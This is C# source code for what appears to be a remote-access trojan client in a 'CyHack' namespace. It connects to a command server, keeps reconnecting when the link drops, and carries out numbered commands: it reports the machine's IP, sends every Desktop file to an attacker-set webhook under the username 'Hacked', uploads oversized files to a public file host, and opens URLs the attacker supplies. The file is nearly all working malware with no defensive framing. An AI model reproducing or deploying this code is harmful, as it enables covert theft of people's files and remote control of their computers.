using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using CyHack;
namespace Client
{

    class Program
    {
        public static string ret(string str)
        {
            var t = str.Remove(0, 1).Replace('`', ' ');

            string ssa = String.Concat(t.Where(c => !Char.IsWhiteSpace(c)));
            return ssa;
        }
        public string WebHock { get; set; }
        static string uploadfile(string File)
        {
            string ReturnValue = string.Empty;
            try
            {
                using (WebClient Client = new WebClient())
                {
                    byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", File);
                    string ResponseBody = Encoding.ASCII.GetString(Response);
                    if (ResponseBody.Contains("\"error\": {"))
                    {
                        ReturnValue += "Error";
                    }
                    else
                    {
                        ReturnValue += "Download link: " + ResponseBody.Split('"')[15] + "\r\n";
                        ReturnValue += "File name: " + ResponseBody.Split('"')[25] + "\r\n";
                    }
                }
            }
            catch (Exception Exception)
            {
                ReturnValue += "Exception Message:\r\n" + Exception.Message + "\r\n";
            }
            return ReturnValue;
        }
        public static void SendDesktop(string url)
        {
            string mediapath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var paths = Directory.GetFiles(mediapath, "*.*", SearchOption.AllDirectories);
            for (int i = 0; i < paths.Length; i++)
            {
                HttpClient client = new HttpClient();
                client.Timeout = TimeSpan.FromHours(10);
                MultipartFormDataContent content = new MultipartFormDataContent();
                WebClient webclient = new WebClient();
                try
                {
                    if (paths.Length - 1 == i)
                    {
                        break;

                    }
                    else
                    {
                        webclient.UploadValues(url, new System.Collections.Specialized.NameValueCollection
            {

                {
                    "content", "```\n"+"The File path : \n"+paths[i]+" \nhas been sending soon.. "+"```"
                },
                 {
                    "username","Hacked"
                },

            });

                    }



                }
                catch
                {
                    Thread.Sleep(5000);

                    SendDesktop(url);
                    break;
                }

                try
                {
                    var file = File.ReadAllBytes(paths[i]);
                    content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(paths[i]), paths[i]);

                    client.PostAsync(url, content).Wait();
                    client.Dispose();

                }
                catch (Exception ex)
                {
                    MultipartFormDataContent contentCatch = new MultipartFormDataContent();

                    if (uploadfile(paths[i]) == "Error")
                    {
                        break;
                    }
                    else
                    {
                        webclient.UploadValues(url, new System.Collections.Specialized.NameValueCollection
            {

                {
                    "content", "```\n"+"the download link : \n"+ uploadfile(paths[i])+" \n sending becuse the size high. "+"```"
                },
                 {
                    "username","log"
                },

            });

                    }


                }



            }

        } 

        static void Main(string[] args)
        {
            Program program = new Program();

            program.ExecuteClient("127.0.0.1",4444);
            
            Console.ReadLine();
        }
        private void OpenUrl(string url)
        {
            try
            {
                Process.Start(url);
            }
            catch
            {
                // hack because of this: https://github.com/dotnet/corefx/issues/10361
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    url = url.Replace("&", "^&");
                    Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                {
                    Process.Start("xdg-open", url);
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                {
                    Process.Start("open", url);
                }
                else
                {
                    throw;
                }
            }
        }

        public void ExecuteClient(string ip,int port)
        {
            
            int x = 0;

            conns:
            try
            {
                TcpClient tcpClient = new TcpClient(ip, port);
                string ms = "6" ;
                int byrtelength = Encoding.ASCII.GetByteCount(ms + 1);
                byte[] dataSend = new byte[byrtelength];
                dataSend = Encoding.ASCII.GetBytes(ms);

                NetworkStream stream = tcpClient.GetStream();
                stream.Write(dataSend, 0, dataSend.Length);
                Console.WriteLine("sending data to server");

                
                StreamReader sr = new StreamReader(stream);
                var msgreseve = sr.ReadLine();

                Console.WriteLine(msgreseve);
                if (msgreseve.IndexOf('1') ==0)
                {
                    StreamWriter sw = new StreamWriter(stream);
                    Net a = new Net();
                    var Myip = a.GetIPAddress();
                    Net net = new Net();
                    sw.Write(Myip);
                    sw.Flush();
                }
                else if (msgreseve.IndexOf('2') == 0)//desktop
                {
                    Net net = new Net();

                    Console.WriteLine(WebHock);
                    net.SendWebHockMessage(WebHock, $"start Send all Desktop Files  in {net.GetIPAddress()} ! ");

                    SendDesktop(WebHock);
                    net.SendWebHockMessage(WebHock, $"Done Send all Desktop Files  in {net.GetIPAddress()} ! ");

                }
                else if (msgreseve.IndexOf('3') == 0)
                {
                    StreamWriter sw = new StreamWriter(stream);

                    var webhock = ret(msgreseve);
                  WebHock = webhock;
                    Console.WriteLine(WebHock);
                    sw.WriteLine(WebHock);
                    sw.Flush();

                }
                else if (msgreseve.IndexOf('4') == 0)//open Brows
                {
                    var g = ret(msgreseve);
                    string link = @$"{g}";
                    Console.WriteLine(link);
                    OpenUrl(link);
                    Net net = new Net();
                    net.SendWebHockMessage(WebHock,$"done open {link} in {net.GetIPAddress()} ! ");

                }




                stream.Close();
                tcpClient.Close();
            goto conns;


        }
            catch (Exception ex)
            {
                x++;
                Console.WriteLine($"connection Catch! Number {x}");
                goto conns;

            }




}

    }

}